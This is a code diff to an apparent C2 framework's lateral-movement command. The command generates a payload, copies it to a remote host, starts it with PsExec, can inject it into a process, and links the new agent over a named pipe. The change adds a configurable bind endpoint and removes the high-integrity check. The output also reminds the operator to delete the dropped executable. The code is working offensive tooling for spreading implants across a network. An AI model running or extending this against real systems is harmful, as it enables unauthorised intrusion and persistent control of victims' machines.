@@ -26,6 +26,7 @@ namespace Commander.Commands.Agent.LateralMovement
         public string service { get; set; }
         public bool inject { get; set; }
 
+        public string endpoint { get; set; }
         public int injectDelay { get; set; }
 
         public string injectProcess { get; set; }
@@ -44,6 +45,7 @@ namespace Commander.Commands.Agent.LateralMovement
         public override RootCommand Command => new RootCommand(Description)
         {
             new Argument("target", "Target where the service will be started"),
+            new Option<string>(new[] { "--endpoint", "-b" }, () => null, "EndPoint to Bind To"),
              new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
              new Option<string>(new[] { "--pipe", "-n" }, () => "jmp","Name of the pipe used to pivot."),
              new Option<string>(new[] { "--file", "-f" }, () => ShortGuid.NewGuid(),"Name of payload."),
@@ -57,13 +59,18 @@ namespace Commander.Commands.Agent.LateralMovement
 
         protected override void Run(ScriptingAgent<JumpPsExecCommandOptions> agent, ScriptingCommander<JumpPsExecCommandOptions> commander, ScriptingTeamServer<JumpPsExecCommandOptions> teamServer, JumpPsExecCommandOptions options, CommanderConfig config)
         {
-            if (agent.Metadata.Integrity != IntegrityLevel.High)
+            if (string.IsNullOrEmpty(options.endpoint))
             {
-                commander.WriteError($"[X] Agent should be in High integrity context!");
-                return;
+                options.endpoint = $"pipe://127.0.0.1:{options.pipe}";
+                commander.WriteLine($"No Endpoint selected, taking the current agent enpoint ({options.endpoint})");
             }
 
-            var endpoint = ConnexionUrl.FromString($"pipe://127.0.0.1:{options.pipe}");
+            var endpoint = ConnexionUrl.FromString(options.endpoint);
+            if (!endpoint.IsValid)
+            {
+                commander.WriteError($"[X] EndPoint is not valid !");
+                return;
+            }
 
             var payloadOptions = new PayloadGenerationOptions()
             {
@@ -103,7 +110,7 @@ namespace Commander.Commands.Agent.LateralMovement
             agent.PsExec(options.target, path);
 
             agent.Delay(2);
-            
+
 
             if (options.inject)
             {
@@ -118,11 +125,14 @@ namespace Commander.Commands.Agent.LateralMovement
                 agent.Echo($"[!] Don't forget to remove executable after use! : shell del {path}");
             }
 
-            var targetEndPoint = ConnexionUrl.FromString($"rpipe://{options.target}:{options.pipe}");
-            agent.Echo($"Linking to {targetEndPoint}");
-            agent.Link(targetEndPoint);
+            if (endpoint.Protocol == ConnexionType.NamedPipe)
+            {
+                var targetEndPoint = ConnexionUrl.FromString($"rpipe://{options.target}:{options.pipe}");
+                agent.Echo($"Linking to {targetEndPoint}");
+                agent.Link(targetEndPoint);
+            }
 
-           
+
 
             agent.Echo($"[*] Execution done!");
             agent.Echo(Environment.NewLine);
